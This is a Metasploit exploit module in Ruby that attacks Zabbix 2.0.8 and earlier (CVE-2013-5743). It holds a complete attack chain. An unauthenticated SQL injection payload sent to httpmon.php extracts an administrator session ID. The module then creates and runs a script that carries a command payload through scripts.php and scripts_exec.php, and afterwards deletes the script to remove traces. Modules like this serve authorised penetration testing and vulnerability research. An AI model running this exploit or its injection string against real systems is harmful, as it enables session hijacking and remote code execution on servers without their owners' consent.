##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Zabbix 2.0.8 SQL Injection and Remote Code Execution",
      'Description'    => %q{
        This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix
        versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an
        active session ID.  If an administrator level user is identified, remote code execution
        can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Lincoln <Lincoln[at]corelan.be>', # Discovery, Original Proof of Concept
          'Jason Kratzer <pyoor[at]corelan.be>' # Metasploit Module
        ],
      'References'     =>
        [
          ['CVE', '2013-5743'],
          ['URL', 'https://support.zabbix.com/browse/ZBX-7091']
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Zabbix version <= 2.0.8', {}]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 255,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl python'
            }
        },
      'DisclosureDate' => "Sep 23 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Zabbix instance', '/zabbix'])
        ], self.class)
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "httpmon.php")
    })

    if res and res.code == 200 and res.body =~ /(STATUS OF WEB MONITORING)/ and res.body =~ /(?<=Zabbix )(.*)(?= Copyright)/
      version = $1
      print_status("#{peer} - Zabbix version #{version} detected")
    else
      # If this fails, guest access may not be enabled
      print_status("#{peer} - Unable to access httpmon.php")
      return Exploit::CheckCode::Unknown
    end

    if version and version <= "2.0.8"
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def get_session_id
    # Generate random string and convert to hex
    sqlq = rand_text_alpha(8)
    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join
    sqli = "2 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST"
    sqli << "(sessionid AS CHAR),0x20)),1,50) FROM zabbix.sessions WHERE status=0 and userid=1 "
    sqli << "LIMIT 0,1),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    # Extract session id from database
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri("#{uri}", "httpmon.php"),
      'vars_get' => {
        "applications" => sqli
      }
    })

    if res && res.code == 200 and res.body =~ /(?<=#{sqlq})(.*)(?=#{sqlq})/
      session = $1
      print_status("#{peer} - Extracted session cookie - [ #{session} ]")
      return session
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to extract a valid session")
    end
  end

  def exploit
    # Retrieve valid session id
    @session = get_session_id
    @sid = "#{@session[16..-1]}"
    script_name = rand_text_alpha(8)
    # Upload script
    print_status("#{peer} - Attempting to inject payload")
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => "zbx_sessionid=#{@session}",
      'uri'    => normalize_uri(uri, "scripts.php"),
      'vars_post' => {
        'sid' => @sid,
        'form' => 'Create+script',
        'name' => script_name,
        'type' => '0',
        'execute_on' => '1',
        'command' => payload.encoded,
        'commandipmi' => '',
        'description' => '',
        'usrgrpid' => '0',
        'groupid' => '0',
        'access' => '2',
        'save' => 'Save'
      }
    })

    if res and res.code == 200 and res.body =~ /(Script added)/
      print_status("#{peer} - Payload injected successfully")
    else
      fail_with(Failure::Unknown, "#{peer} - Payload injection failed!")
    end

    # Extract 'scriptid' value
    @scriptid = /(?<=scriptid=)(\d+)(?=&sid=#{@sid}">#{script_name})/.match(res.body)

    # Trigger Payload
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri("#{uri}", "scripts_exec.php"),
      'cookie' => "zbx_sessionid=#{@session}",
      'vars_get' => {
        "execute" =>1,
        "scriptid" => @scriptid,
        "sid" => @sid,
        "hostid" => "10084"
      }
    })
  end

  def cleanup
    post_data = "sid=#{@sid}&form_refresh=1&scripts[#{@scriptid}]=#{@scriptid}&go=delete&goButton=Go (1)"
    print_status("#{peer} - Cleaning script remnants")
    res = send_request_cgi({
     'method' => 'POST',
      'data'   => post_data,
      'cookie' => "zbx_sessionid=#{@session}",
      'uri'    => normalize_uri(uri, "scripts.php")
    })

    if res and res.code == 200 and res.body =~ /(Script deleted)/
      print_status("#{peer} - Script removed successfully")
    else
      print_warning("#{peer} - Unable to remove script #{@scriptid}")
    end
  end
end
